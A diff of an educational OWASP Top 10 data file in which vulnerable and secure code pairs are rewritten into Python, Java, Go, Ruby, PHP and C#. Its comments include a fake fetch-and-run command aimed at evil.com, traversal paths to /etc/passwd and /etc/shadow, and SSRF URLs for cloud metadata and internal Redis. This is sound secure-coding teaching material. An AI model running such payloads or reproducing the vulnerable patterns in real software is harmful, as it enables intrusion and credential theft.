@@ -2,6 +2,7 @@
  * data.js — OWASP Top 10 (2025 vs 2021) Educational Data
  * Contains structured descriptions, code examples, and sandbox configs
  * for each vulnerability category. Each category has 5 code comparison examples.
+ * Examples use diverse programming languages: Python, Java, Go, C#, PHP, Ruby, JavaScript, etc.
  */
 
 const OWASP_DATA = [
@@ -28,235 +29,303 @@ const OWASP_DATA = [
     },
     examples: [
       {
-        title: "CSS-Hidden Admin Panel vs. JWT Role Check",
-        vulnerableCode: `<!-- Vulnerable: Admin panel hidden only by CSS -->
-<div id="admin-panel" style="display:none;">
-  <h2>Admin Dashboard</h2>
-  <p>Secret: API_KEY=sk-12345-ABCDE</p>
-  <button onclick="deleteAllUsers()">Delete All Users</button>
-</div>
-
-<script>
-  // Anyone can run in the console:
-  // document.getElementById('admin-panel')
-  //   .style.display = 'block';
-  // ...and the admin panel is fully exposed.
-</script>`,
-        secureCode: `<!-- Secure: Panel rendered only after role verification -->
-<div id="admin-panel"></div>
-
-<script>
-  function verifyRole(token) {
-    try {
-      const payload = JSON.parse(atob(token.split('.')[1]));
-      return payload.role === 'admin'
-          && payload.exp > Date.now() / 1000;
-    } catch {
-      return false;
-    }
-  }
-
-  function renderAdminPanel() {
-    const token = localStorage.getItem('auth_token');
-    if (!verifyRole(token)) {
-      document.getElementById('admin-panel').textContent =
-        'Access Denied — Insufficient privileges.';
-      return;
-    }
-    const panel = document.getElementById('admin-panel');
-    panel.innerHTML = \`
-      <h2>Admin Dashboard</h2>
-      <p>Welcome, verified administrator.</p>\`;
-  }
-
-  renderAdminPanel();
-</script>`,
-      },
-      {
         title: "Insecure Direct Object Reference (IDOR)",
-        vulnerableCode: `// Vulnerable: User can access any record by changing the ID
-app.get('/api/invoices/:id', (req, res) => {
-  const invoice = db.invoices.findById(req.params.id);
+        vulnerableCode: `# Python Flask — Vulnerable: No ownership check
+from flask import Flask, request, jsonify
 
-  // No check: does this invoice belong to the logged-in user?
-  if (!invoice) {
-    return res.status(404).json({ error: 'Not found' });
-  }
+app = Flask(__name__)
 
-  res.json(invoice); // Anyone can access ANY invoice
-});
+@app.route('/api/invoices/<int:invoice_id>')
+def get_invoice(invoice_id):
+    # User can access ANY invoice by changing the ID
+    invoice = db.invoices.find_by_id(invoice_id)
 
-// An attacker simply increments the ID:
-// GET /api/invoices/1001  ← their invoice
-// GET /api/invoices/1002  ← someone else's invoice
-// GET /api/invoices/1003  ← another user's data
-// All return 200 OK with full invoice details.`,
-        secureCode: `// Secure: Verify the resource belongs to the requesting user
-app.get('/api/invoices/:id', authenticate, (req, res) => {
-  const invoice = db.invoices.findById(req.params.id);
+    if not invoice:
+        return jsonify({"error": "Not found"}), 404
 
-  if (!invoice) {
-    return res.status(404).json({ error: 'Not found' });
-  }
+    # No check: does this invoice belong to the logged-in user?
+    return jsonify(invoice.to_dict())
 
-  // Ownership check: does this invoice belong to the user?
-  if (invoice.userId !== req.user.id) {
-    securityLogger.warn({
-      event: 'IDOR_ATTEMPT',
-      user: req.user.id,
-      targetInvoice: req.params.id
-    });
-    return res.status(403).json({ error: 'Forbidden' });
-  }
+# An attacker simply increments the ID:
+# GET /api/invoices/1001  ← their invoice
+# GET /api/invoices/1002  ← someone else's invoice
+# GET /api/invoices/1003  ← another user's private data
+# All return 200 OK with full invoice details.`,
+        secureCode: `# Python Flask — Secure: Ownership verification
+from flask import Flask, request, jsonify
+from functools import wraps
 
-  res.json(invoice);
-});
+def login_required(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        user = get_current_user(request)
+        if not user:
+            return jsonify({"error": "Unauthorized"}), 401
+        request.user = user
+        return f(*args, **kwargs)
+    return decorated
 
-// GET /api/invoices/1002 → 403 Forbidden
-// Attacker cannot access other users' invoices.`,
+@app.route('/api/invoices/<int:invoice_id>')
+@login_required
+def get_invoice(invoice_id):
+    invoice = db.invoices.find_by_id(invoice_id)
+
+    if not invoice:
+        return jsonify({"error": "Not found"}), 404
+
+    # Ownership check: does this invoice belong to the user?
+    if invoice.user_id != request.user.id:
+        security_logger.warning(
+            "IDOR_ATTEMPT",
+            user=request.user.id,
+            target_invoice=invoice_id
+        )
+        return jsonify({"error": "Forbidden"}), 403
+
+    return jsonify(invoice.to_dict())
+
+# GET /api/invoices/1002 → 403 Forbidden
+# Attacker cannot access other users' invoices.`,
       },
       {
         title: "Missing Function-Level Access Control",
-        vulnerableCode: `// Vulnerable: API relies only on client-side role checks
-// Frontend hides the "Delete User" button for non-admins,
-// but the API endpoint has NO server-side check.
+        vulnerableCode: `// Java Spring Boot — Vulnerable: No server-side role check
+@RestController
+public class UserController {
 
-app.delete('/api/users/:id', (req, res) => {
-  // No authorization check at all!
-  db.users.delete(req.params.id);
-  res.json({ message: 'User deleted' });
-});
+    // Frontend hides the "Delete User" button for non-admins,
+    // but the API endpoint has NO server-side check.
 
-// Any authenticated user can call:
-// DELETE /api/users/42
-// ...even if the UI doesn't show a delete button.
-// The API trusts the client to enforce roles.`,
-        secureCode: `// Secure: Server-side role check on every endpoint
-function requireRole(...roles) {
-  return (req, res, next) => {
-    if (!req.user || !roles.includes(req.user.role)) {
-      securityLogger.warn({
-        event: 'UNAUTHORIZED_ACCESS',
-        user: req.user?.id,
-        requiredRoles: roles,
-        endpoint: req.originalUrl
-      });
-      return res.status(403).json({ error: 'Forbidden' });
+    @DeleteMapping("/api/users/{id}")
+    public ResponseEntity<?> deleteUser(@PathVariable Long id) {
+        // No authorization check at all!
+        userRepository.deleteById(id);
+        return ResponseEntity.ok(
+            Map.of("message", "User deleted")
+        );
     }
-    next();
-  };
+
+    // Any authenticated user can call:
+    // DELETE /api/users/42
+    // ...even if the UI doesn't show a delete button.
+    // The API trusts the client to enforce roles.
+}`,
+        secureCode: `// Java Spring Boot — Secure: Role-based access control
+@RestController
+public class UserController {
+
+    @DeleteMapping("/api/users/{id}")
+    @PreAuthorize("hasRole('ADMIN')")  // Spring Security check
+    public ResponseEntity<?> deleteUser(
+            @PathVariable Long id,
+            @AuthenticationPrincipal UserDetails currentUser) {
+
+        // Log the deletion for audit trail
+        securityLogger.info(
+            "USER_DELETED by={} target={}",
+            currentUser.getUsername(), id
+        );
+
+        userRepository.deleteById(id);
+        return ResponseEntity.ok(
+            Map.of("message", "User deleted")
+        );
+    }
 }
 
-// Middleware enforces admin-only access
-app.delete('/api/users/:id',
-  authenticate,
-  requireRole('admin'),
-  (req, res) => {
-    db.users.delete(req.params.id);
-    res.json({ message: 'User deleted' });
-  }
-);`,
+// Spring Security configuration ensures:
+// 1. @PreAuthorize is evaluated BEFORE the method runs
+// 2. Non-admin users get 403 Forbidden automatically
+// 3. Unauthenticated users get 401 Unauthorized`,
+      },
+      {
+        title: "Path Traversal",
+        vulnerableCode: `# Ruby Sinatra — Vulnerable: User-controlled file path
+require 'sinatra'
+
+get '/api/files' do
+  filename = params[:name]
+
+  # Directly concatenate user input into file path
+  file_path = "/var/www/uploads/#{filename}"
+  send_file file_path
+end
+
+# An attacker requests:
+# GET /api/files?name=../../../etc/passwd
+#
+# Resolved path: /var/www/uploads/../../../etc/passwd
+# Actual path:   /etc/passwd
+#
+# The server reads and returns the system password file.
+# Works for any file readable by the process.
+#
+# More attacks:
+# ?name=../../.env          → environment secrets
+# ?name=../../../etc/shadow → password hashes`,
+        secureCode: `# Ruby Sinatra — Secure: Validate and normalize path
+require 'sinatra'
+require 'pathname'
+
+UPLOADS_DIR = Pathname.new("/var/www/uploads").realpath
+
+get '/api/files' do
+  filename = params[:name]
+
+  # Reject empty filenames and path separators
+  halt 400, { error: "Invalid filename" }.to_json unless filename
+  halt 400, { error: "Invalid filename" }.to_json if filename.include?("/") || filename.include?("\\\\")
+  halt 400, { error: "Invalid filename" }.to_json if filename.include?("..")
+
+  # Resolve to absolute and verify it's within UPLOADS_DIR
+  resolved = (UPLOADS_DIR / filename).realpath rescue nil
+
+  unless resolved && resolved.to_s.start_with?(UPLOADS_DIR.to_s)
+    SecurityLogger.warn(
+      event: "PATH_TRAVERSAL_ATTEMPT",
+      user: current_user&.id,
+      attempted: filename
+    )
+    halt 403, { error: "Forbidden" }.to_json
+  end
+
+  send_file resolved.to_s
+end
+
+# ../../../etc/passwd → 403 Forbidden
+# normal_file.pdf    → 200 OK`,
       },
       {
         title: "CORS Misconfiguration",
-        vulnerableCode: `// Vulnerable: Wildcard CORS with credentials
-app.use((req, res, next) => {
-  // Reflects any origin — even malicious ones
-  res.setHeader(
-    'Access-Control-Allow-Origin',
-    req.headers.origin || '*'
-  );
-  res.setHeader(
-    'Access-Control-Allow-Credentials', 'true'
-  );
-  res.setHeader(
-    'Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE'
-  );
-  next();
-});
+        vulnerableCode: `// Go — Vulnerable: Reflects any origin with credentials
+package main
+
+import "net/http"
+
+func corsMiddleware(next http.Handler) http.Handler {
+    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        // Reflects ANY origin — even malicious ones
+        origin := r.Header.Get("Origin")
+        if origin == "" {
+            origin = "*"
+        }
+        w.Header().Set("Access-Control-Allow-Origin", origin)
+        w.Header().Set("Access-Control-Allow-Credentials", "true")
+        w.Header().Set("Access-Control-Allow-Methods",
+            "GET,POST,PUT,DELETE")
+
+        next.ServeHTTP(w, r)
+    })
+}
 
 // An attacker's page at https://evil.com can now:
-// fetch('https://your-api.com/api/user/profile', {
-//   credentials: 'include'  // sends cookies!
-// }).then(r => r.json())
-//   .then(data => sendToAttacker(data));`,
-        secureCode: `// Secure: Strict allowlist of trusted origins
-const ALLOWED_ORIGINS = new Set([
-  'https://app.yoursite.com',
-  'https://admin.yoursite.com'
-]);
+//   fetch('https://your-api.com/api/profile', {
+//     credentials: 'include'
+//   })
+// The browser sends the victim's cookies,
+// and the response is readable by the attacker.`,
+        secureCode: `// Go — Secure: Strict allowlist of trusted origins
+package main
 
-app.use((req, res, next) => {
-  const origin = req.headers.origin;
+import "net/http"
 
-  if (ALLOWED_ORIGINS.has(origin)) {
-    res.setHeader('Access-Control-Allow-Origin', origin);
-    res.setHeader(
-      'Access-Control-Allow-Credentials', 'true'
-    );
-    res.setHeader(
-      'Access-Control-Allow-Methods', 'GET,POST'
-    );
-    res.setHeader(
-      'Access-Control-Allow-Headers',
-      'Content-Type, Authorization'
-    );
-  }
-  // If origin is not in the allowlist, no CORS
-  // headers are set — browser blocks the request.
+var allowedOrigins = map[string]bool{
+    "https://app.yoursite.com":   true,
+    "https://admin.yoursite.com": true,
+}
 
-  next();
-});
+func corsMiddleware(next http.Handler) http.Handler {
+    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        origin := r.Header.Get("Origin")
+
+        if allowedOrigins[origin] {
+            w.Header().Set("Access-Control-Allow-Origin", origin)
+            w.Header().Set("Access-Control-Allow-Credentials", "true")
+            w.Header().Set("Access-Control-Allow-Methods", "GET,POST")
+            w.Header().Set("Access-Control-Allow-Headers",
+                "Content-Type, Authorization")
+            w.Header().Set("Access-Control-Max-Age", "86400")
+        }
+        // If origin is not in the allowlist, no CORS
+        // headers are set — browser blocks the request.
+
+        if r.Method == "OPTIONS" {
+            w.WriteHeader(http.StatusNoContent)
+            return
+        }
+
+        next.ServeHTTP(w, r)
+    })
+}
 
 // https://evil.com → blocked by browser (no CORS header)
 // https://app.yoursite.com → allowed`,
       },
       {
-        title: "Path Traversal",
-        vulnerableCode: `// Vulnerable: User-controlled file path with no validation
-app.get('/api/files', (req, res) => {
-  const filename = req.query.name;
+        title: "Server-Side Request Forgery (SSRF)",
+        vulnerableCode: `<?php
+// PHP — Vulnerable: User-controlled URL fetch
+// The user provides a URL and the server fetches it
 
-  // Directly concatenate user input into file path
-  const filePath = '/var/www/uploads/' + filename;
-  res.sendFile(filePath);
-});
+$url = $_GET['url'];
 
-// An attacker requests:
-// GET /api/files?name=../../../etc/passwd
-//
-// Resolved path: /var/www/uploads/../../../etc/passwd
-// Actual path:   /etc/passwd
-//
-// The server reads and returns the system password file.
-// Works for any file readable by the process.`,
-        secureCode: `// Secure: Validate and normalize the file path
-const path = require('path');
+// Server fetches whatever URL the user provides
+$response = file_get_contents($url);
+echo $response;
 
-const UPLOADS_DIR = '/var/www/uploads';
+// Attacker requests:
+// GET /fetch?url=http://169.254.169.254/latest/meta-data/
+// → Returns AWS instance metadata (IAM credentials!)
 
-app.get('/api/files', authenticate, (req, res) => {
-  const filename = req.query.name;
+// GET /fetch?url=http://localhost:6379/CONFIG+SET+dir+/tmp/
+// → Sends commands to internal Redis server
 
-  // Reject path separators and traversal sequences
-  if (!filename || /[\\/]|\\.\\./g.test(filename)) {
-    return res.status(400).json({ error: 'Invalid filename' });
-  }
+// GET /fetch?url=file:///etc/passwd
+// → Reads local files via file:// protocol
 
-  // Resolve to absolute and verify it's within UPLOADS_DIR
-  const resolved = path.resolve(UPLOADS_DIR, filename);
+// The server acts as a proxy, reaching internal
+// services that are not accessible from the internet.
+?>`,
+        secureCode: `<?php
+// PHP — Secure: URL validation + allowlist
+function fetchUrl(string $url): string {
+    // Parse and validate the URL
+    $parsed = parse_url($url);
+    if (!$parsed || !isset($parsed['host'])) {
+        throw new InvalidArgumentException("Invalid URL");
+    }
 
-  if (!resolved.startsWith(UPLOADS_DIR + path.sep)) {
-    securityLogger.warn({
-      event: 'PATH_TRAVERSAL_ATTEMPT',
-      user: req.user.id,
-      attempted: filename
-    });
-    return res.status(403).json({ error: 'Forbidden' });
-  }
+    // Only allow HTTPS
+    if (($parsed['scheme'] ?? '') !== 'https') {
+        throw new InvalidArgumentException("Only HTTPS allowed");
+    }
 
-  res.sendFile(resolved);
-});`,
+    // Allowlist of permitted domains
+    $allowedDomains = ['api.example.com', 'cdn.example.com'];
+    if (!in_array($parsed['host'], $allowedDomains, true)) {
+        throw new InvalidArgumentException("Domain not allowed");
+    }
+
+    // Resolve DNS and block internal IPs
+    $ip = gethostbyname($parsed['host']);
+    if (isInternalIP($ip)) {
+        $logger->warning("SSRF attempt blocked", [
+            'url' => $url, 'resolved_ip' => $ip
+        ]);
+        throw new SecurityException("Internal IP blocked");
+    }
+
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
+    // Block file://, gopher://, dict:// protocols
+    curl_setopt($ch, CURLOPT_PROTOCOLS,
+        CURLPROTO_HTTPS);
+
+    return curl_exec($ch);
+}
+?>`,
       },
     ],
   },
@@ -285,6 +354,8 @@ app.get('/api/files', authenticate, (req, res) => {
     examples: [
       {
         title: "Exposed Directory Listing & Sensitive Files",
+        vulnLang: "bash",
+        secureLang: "bash",
         vulnerableCode: `# Vulnerable: Apache server with directory listing enabled
 # .htaccess — MISSING or misconfigured
 Options +Indexes
@@ -329,166 +400,207 @@ ErrorDocument 500 /errors/500.html`,
       },
       {
         title: "Default Credentials Left Enabled",
-        vulnerableCode: `// Vulnerable: Application ships with default admin credentials
-// config/default-users.js
-const DEFAULT_USERS = [
-  {
-    username: 'admin',
-    password: 'admin',     // Default credentials!
-    role: 'administrator'
-  },
-  {
-    username: 'test',
-    password: 'test123',   // Test account in production!
-    role: 'administrator'
-  }
-];
+        vulnerableCode: `# Python Django — Vulnerable: Default admin credentials
+# settings.py
+DEFAULT_ADMIN_USERNAME = "admin"
+DEFAULT_ADMIN_PASSWORD = "admin"
 
-// setup.js — runs on first boot
-function initializeDatabase() {
-  DEFAULT_USERS.forEach(user => {
-    db.users.create(user);
-  });
-  // No prompt to change passwords
-  // No flag to track if defaults were changed
-  console.log('Default users created.');
-}`,
-        secureCode: `// Secure: Force password change on first login
-function initializeDatabase() {
-  const adminPassword = crypto.randomUUID();
+# management/commands/setup.py
+from django.contrib.auth.models import User
 
-  db.users.create({
-    username: 'admin',
-    password: await hashPassword(adminPassword),
-    role: 'administrator',
-    mustChangePassword: true,  // Force change on first login
-    createdAt: new Date()
-  });
+class Command(BaseCommand):
+    def handle(self, *args, **options):
+        # Creates admin with hardcoded password
+        User.objects.create_superuser(
+            username="admin",
+            password="admin",       # Default credentials!
+            email="admin@example.com"
+        )
 
-  // Display the generated password once during setup
-  console.log('Initial admin password (change immediately):');
-  console.log(adminPassword);
-}
+        User.objects.create_superuser(
+            username="test",
+            password="test123",     # Test account in production!
+            email="test@example.com"
+        )
 
-// Login middleware checks mustChangePassword flag
-async function loginHandler(req, res) {
-  const user = await authenticate(req.body);
-  if (!user) return res.status(401).json({ error: 'Invalid' });
+        self.stdout.write("Default users created.")
+        # No prompt to change passwords
+        # No flag to track if defaults were changed`,
+        secureCode: `# Python Django — Secure: Force password change on first login
+import secrets
+from django.contrib.auth.models import User
 
-  if (user.mustChangePassword) {
-    return res.status(403).json({
-      error: 'Password change required',
-      redirect: '/change-password'
-    });
-  }
+class Command(BaseCommand):
+    def handle(self, *args, **options):
+        # Generate a cryptographically secure random password
+        admin_password = secrets.token_urlsafe(24)
 
-  // Enforce minimum password complexity
-  // Reject passwords that match known defaults
-  issueSession(user, res);
-}`,
+        admin = User.objects.create_superuser(
+            username="admin",
+            password=admin_password,
+            email="admin@example.com"
+        )
+
+        # Mark that password MUST be changed on first login
+        AdminProfile.objects.create(
+            user=admin,
+            must_change_password=True,
+            created_at=timezone.now()
+        )
+
+        # Display the generated password once during setup
+        self.stdout.write(
+            f"Initial admin password (change immediately):"
+        )
+        self.stdout.write(admin_password)
+
+# Login middleware checks must_change_password flag
+class ForcePasswordChangeMiddleware:
+    def __call__(self, request):
+        if request.user.is_authenticated:
+            profile = request.user.adminprofile
+            if profile.must_change_password:
+                if request.path != "/change-password/":
+                    return redirect("/change-password/")
+        return self.get_response(request)`,
       },
       {
         title: "Verbose Error Messages in Production",
-        vulnerableCode: `// Vulnerable: Detailed errors exposed to users in production
-app.use((err, req, res, next) => {
-  // Sends EVERYTHING to the client
-  res.status(500).json({
-    error: err.message,
-    stack: err.stack,
-    // Exposes:
-    //   "at Object.<anonymous> (/app/src/routes/users.js:42:15)"
-    //   "at Router.handle (/app/node_modules/express/lib/router)"
-    query: req.query,
-    body: req.body,
-    headers: req.headers,
-    env: process.env.NODE_ENV  // "production"
-  });
-});
+        vulnerableCode: `// C# ASP.NET — Vulnerable: Detailed errors sent to users
+public class ErrorController : Controller
+{
+    [Route("/error")]
+    public IActionResult HandleError()
+    {
+        var exceptionFeature = HttpContext.Features
+            .Get<IExceptionHandlerFeature>();
+        var exception = exceptionFeature?.Error;
+
+        // Sends EVERYTHING to the client
+        return StatusCode(500, new {
+            error = exception?.Message,
+            // "System.Data.SqlClient.SqlException:
+            //  Login failed for user 'sa'"
+            stackTrace = exception?.StackTrace,
+            // Reveals file paths, framework versions
+            innerException = exception?.InnerException?.Message,
+            source = exception?.Source,
+            // "Microsoft.EntityFrameworkCore"
+            environment = Environment.GetEnvironmentVariable(
+                "ASPNETCORE_ENVIRONMENT")
+        });
+    }
+}
 
 // Attacker learns:
+// - Database type and connection details
 // - File paths and directory structure
 // - Framework and library versions
-// - Database connection strings in stack traces
-// - Internal API endpoints from error context`,
-        secureCode: `// Secure: Generic errors for users, detailed logs internally
-const isProd = process.env.NODE_ENV === 'production';
+// - Internal service architecture`,
+        secureCode: `// C# ASP.NET — Secure: Generic errors for users
+public class ErrorController : Controller
+{
+    private readonly ILogger<ErrorController> _logger;
 
-app.use((err, req, res, next) => {
-  // Generate a unique reference ID for this error
-  const errorId = crypto.randomUUID();
+    [Route("/error")]
+    public IActionResult HandleError()
+    {
+        var exceptionFeature = HttpContext.Features
+            .Get<IExceptionHandlerFeature>();
+        var exception = exceptionFeature?.Error;
 
-  // Log full details INTERNALLY (never to client)
-  logger.error({
-    errorId,
-    message: err.message,
-    stack: err.stack,
-    url: req.originalUrl,
-    method: req.method,
-    userId: req.user?.id,
-    timestamp: new Date().toISOString()
-  });
+        // Generate unique reference ID
+        var errorId = Guid.NewGuid().ToString();
 
-  // Send minimal info to client
-  res.status(err.statusCode || 500).json(
-    isProd
-      ? {
-          error: 'An internal error occurred.',
-          referenceId: errorId
-        }
-      : {
-          error: err.message,
-          stack: err.stack  // Only in development
-        }
-  );
-});`,
+        // Log full details INTERNALLY (never to client)
+        _logger.LogError(exception,
+            "Unhandled exception. ErrorId={ErrorId}, " +
+            "Path={Path}, User={User}",
+            errorId,
+            HttpContext.Request.Path,
+            User.Identity?.Name ?? "anonymous"
+        );
+
+        // Send minimal info to client
+        var isDev = Environment.GetEnvironmentVariable(
+            "ASPNETCORE_ENVIRONMENT") == "Development";
+
+        return StatusCode(500, isDev
+            ? new { error = exception?.Message }
+            : new {
+                error = "An internal error occurred.",
+                referenceId = errorId
+              }
+        );
+    }
+}`,
       },
       {
         title: "Unnecessary HTTP Methods Enabled",
-        vulnerableCode: `// Vulnerable: All HTTP methods accepted on every route
-// Express defaults to accepting any method if not restricted
+        vulnerableCode: `# Python Flask — Vulnerable: All methods accepted
+from flask import Flask
 
-// This route only needs GET, but accepts everything:
-app.all('/api/users', (req, res) => {
-  const users = db.users.findAll();
-  res.json(users);
-});
+app = Flask(__name__)
 
-// An attacker can:
-// DELETE /api/users → might trigger unexpected behavior
-// TRACE  /api/users → reflects headers (XST attack)
-// PUT    /api/users → may overwrite data
-// OPTIONS /api/users → reveals all allowed methods
+# This route only needs GET, but accepts everything
+@app.route('/api/users', methods=[
+    'GET', 'POST', 'PUT', 'DELETE',
+    'PATCH', 'OPTIONS', 'TRACE'
+])
+def users():
+    users = db.users.find_all()
+    return jsonify(users)
 
-// Server response to OPTIONS:
-// Allow: GET, HEAD, POST, PUT, DELETE, PATCH, TRACE
-// This tells the attacker exactly what to try.`,
-        secureCode: `// Secure: Explicitly define allowed methods per route
-const express = require('express');
-const router = express.Router();
+# An attacker can:
+# DELETE /api/users → might trigger unexpected behavior
+# TRACE  /api/users → reflects headers (XST attack)
+# PUT    /api/users → may overwrite data
+# OPTIONS /api/users → reveals all allowed methods
 
-// Only allow the methods each route actually needs
-router.route('/api/users')
-  .get(authenticate, listUsers)
-  .post(authenticate, requireRole('admin'), createUser)
-  .all((req, res) => {
-    res.status(405)
-       .set('Allow', 'GET, POST')
-       .json({ error: 'Method Not Allowed' });
-  });
+# Server response to OPTIONS:
+# Allow: GET, POST, PUT, DELETE, PATCH, OPTIONS, TRACE
+# This tells the attacker exactly what to try.`,
+        secureCode: `# Python Flask — Secure: Explicit methods per route
+from flask import Flask, jsonify, request
+from functools import wraps
 
-// Disable TRACE globally
-app.use((req, res, next) => {
-  if (req.method === 'TRACE') {
-    return res.status(405).json({ error: 'TRACE disabled' });
-  }
-  next();
-});
+app = Flask(__name__)
 
-// Remove X-Powered-By header (hides Express fingerprint)
-app.disable('x-powered-by');`,
+def require_role(*roles):
+    def decorator(f):
+        @wraps(f)
+        def decorated(*args, **kwargs):
+            if not current_user or current_user.role not in roles:
+                return jsonify({"error": "Forbidden"}), 403
+            return f(*args, **kwargs)
+        return decorated
+    return decorator
+
+# Only allow the methods each route actually needs
+@app.route('/api/users', methods=['GET'])
+@login_required
+def list_users():
+    return jsonify(db.users.find_all())
+
+@app.route('/api/users', methods=['POST'])
+@login_required
+@require_role('admin')
+def create_user():
+    return jsonify(db.users.create(request.json)), 201
+
+# Any other method returns 405 Method Not Allowed
+# Flask handles this automatically when methods are explicit
+
+# Disable TRACE globally
+@app.before_request
+def block_trace():
+    if request.method == 'TRACE':
+        return jsonify({"error": "TRACE disabled"}), 405`,
       },
       {
         title: "Missing Security Headers",
+        vulnLang: "markup",
+        secureLang: "go",
         vulnerableCode: `<!-- Vulnerable: No security headers set -->
 <!-- Server response headers: -->
 <!--
@@ -511,41 +623,42 @@ app.disable('x-powered-by');`,
 <!-- 3. No HTTPS enforcement (downgrade attacks) -->
 <!-- 4. Referer header leaks URLs to third parties -->
 <!-- 5. X-Powered-By reveals tech stack to attackers -->`,
-        secureCode: `// Secure: Comprehensive security headers (using Helmet.js)
-const helmet = require('helmet');
+        secureCode: `// Go — Secure: Comprehensive security headers middleware
+package main
 
-app.use(helmet());
+import "net/http"
 
-// Or set them manually:
-app.use((req, res, next) => {
-  // Prevent clickjacking
-  res.setHeader('X-Frame-Options', 'DENY');
+func securityHeaders(next http.Handler) http.Handler {
+    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        // Prevent clickjacking
+        w.Header().Set("X-Frame-Options", "DENY")
 
-  // Stop MIME-type sniffing
-  res.setHeader('X-Content-Type-Options', 'nosniff');
+        // Stop MIME-type sniffing
+        w.Header().Set("X-Content-Type-Options", "nosniff")
 
-  // Enforce HTTPS for 1 year + subdomains
-  res.setHeader('Strict-Transport-Security',
-    'max-age=31536000; includeSubDomains; preload');
+        // Enforce HTTPS for 1 year
+        w.Header().Set("Strict-Transport-Security",
+            "max-age=31536000; includeSubDomains; preload")
 
-  // Control referrer information
-  res.setHeader('Referrer-Policy',
-    'strict-origin-when-cross-origin');
+        // Control referrer information
+        w.Header().Set("Referrer-Policy",
+            "strict-origin-when-cross-origin")
 
-  // Content Security Policy
-  res.setHeader('Content-Security-Policy',
-    "default-src 'self'; script-src 'self'; style-src 'self'");
+        // Content Security Policy
+        w.Header().Set("Content-Security-Policy",
+            "default-src 'self'; script-src 'self'")
 
-  // Restrict browser features
-  res.setHeader('Permissions-Policy',
-    'camera=(), microphone=(), geolocation=()');
+        // Restrict browser features
+        w.Header().Set("Permissions-Policy",
+            "camera=(), microphone=(), geolocation=()")
 
-  // Hide tech stack
-  res.removeHeader('X-Powered-By');
-  res.removeHeader('Server');
+        // Remove server fingerprint headers
+        w.Header().Del("X-Powered-By")
+        w.Header().Del("Server")
 
-  next();
-});`,
+        next.ServeHTTP(w, r)
+    })
+}`,
       },
     ],
   },
@@ -606,22 +719,25 @@ app.use((req, res, next) => {
 </script>
 
 <!--
-  If the file has been tampered with, the browser
-  computes the hash, finds a mismatch, and BLOCKS
-  the script from executing entirely.
+  HOW IT WORKS:
+  1. Browser downloads the script file
+  2. Computes SHA-384 hash of the file contents
+  3. Compares computed hash with the 'integrity' attribute
+  4. If hashes DON'T match → script is BLOCKED entirely
 
   Console output on mismatch:
   "Failed to find a valid digest in the 'integrity'
    attribute for resource '...' with computed
-   SHA-384 integrity '...'. The resource has been
-   blocked."
--->
+   SHA-384 integrity '...'. The resource has been blocked."
 
-<!-- Also pin exact versions in package-lock.json -->
-<!-- Use npm audit / Snyk / Socket.dev in CI/CD -->`,
+  Generate SRI hash with:
+  shasum -b -a 384 utils.min.js | xxd -r -p | base64
+-->`,
       },
       {
         title: "Unpinned Dependency Versions",
+        vulnLang: "json",
+        secureLang: "json",
         vulnerableCode: `// package.json — Vulnerable: loose version ranges
 {
   "dependencies": {
@@ -671,53 +787,56 @@ app.use((req, res, next) => {
       },
       {
         title: "Dependency Confusion Attack",
-        vulnerableCode: `// .npmrc — Vulnerable: default registry order
-// No registry scope mapping
+        vulnLang: "python",
+        secureLang: "bash",
+        vulnerableCode: `# Python pip — Vulnerable: no index URL scoping
+# requirements.txt
+company-auth-utils==2.0.0
+company-data-models==1.5.0
 
-// package.json
-{
-  "dependencies": {
-    "@company/auth-utils": "^2.0.0"
-  }
-}
+# pip.conf — No private index configuration
+# pip looks at PyPI (public) first by default
 
-// The problem:
-// 1. @company/auth-utils exists on your private registry
-// 2. An attacker publishes @company/auth-utils@99.0.0
-//    on the PUBLIC npm registry
-// 3. npm resolves the highest version number
-// 4. npm installs the attacker's 99.0.0 from public npm
-//    instead of your private 2.x.x
-//
-// The malicious package runs a postinstall script:
-// "scripts": {
-//   "postinstall": "curl https://evil.com/shell.sh | sh"
-// }`,
-        secureCode: `// .npmrc — Secure: scope-to-registry mapping
-@company:registry=https://npm.company.com/
-//npm.company.com/:_authToken=\${NPM_TOKEN}
+# The problem:
+# 1. company-auth-utils exists on your private PyPI
+# 2. An attacker publishes company-auth-utils==99.0.0
+#    on the PUBLIC PyPI
+# 3. pip resolves the highest version number
+# 4. pip installs the attacker's 99.0.0 from public PyPI
+#    instead of your private 2.0.0
 
-// This ensures all @company/* packages ONLY come
-// from your private registry — never from public npm.
+# The malicious package runs a setup.py script:
+# import subprocess
+# subprocess.call([
+#     "curl", "https://evil.com/shell.sh", "|", "sh"
+# ])`,
+        secureCode: `# Python pip — Secure: scoped index configuration
+# pip.conf — Restrict where packages come from
+# [global]
+# index-url = https://pypi.company.com/simple/
+# extra-index-url = https://pypi.org/simple/
 
-// Additional protections:
+# Better: use requirements.txt with hashes
+# requirements.txt
+company-auth-utils==2.0.0 \\
+    --hash=sha256:abc123def456...
+company-data-models==1.5.0 \\
+    --hash=sha256:789ghi012jkl...
 
-// 1. Claim your scope on public npm (even if unused)
-//    npm org create @company
+# pip install --require-hashes -r requirements.txt
+# If the hash doesn't match, installation FAILS
 
-// 2. Use package-lock.json with integrity hashes
-//    "resolved": "https://npm.company.com/@company/auth..."
-
-// 3. CI pipeline validation:
-{
-  "scripts": {
-    "preinstall": "npx lockfile-lint --path package-lock.json --type npm --allowed-hosts npm.company.com"
-  }
-}
-
-// 4. Audit postinstall scripts:
-//    npm install --ignore-scripts
-//    npx can-i-ignore-scripts`,
+# Additional protections:
+# 1. Register your package names on public PyPI
+#    (even if you never publish there)
+# 2. Use pip --index-url (not --extra-index-url)
+#    to specify ONLY your private index
+# 3. Use pipenv or poetry with explicit sources:
+#
+# [[tool.poetry.source]]
+# name = "company"
+# url = "https://pypi.company.com/simple/"
+# priority = "primary"`,
       },
       {
         title: "Compromised Build Pipeline",
@@ -790,54 +909,57 @@ jobs:
       },
       {
         title: "Typosquatting / Malicious Packages",
-        vulnerableCode: `// Vulnerable: Installing packages without verification
-// A developer types quickly and makes a typo:
+        vulnLang: "bash",
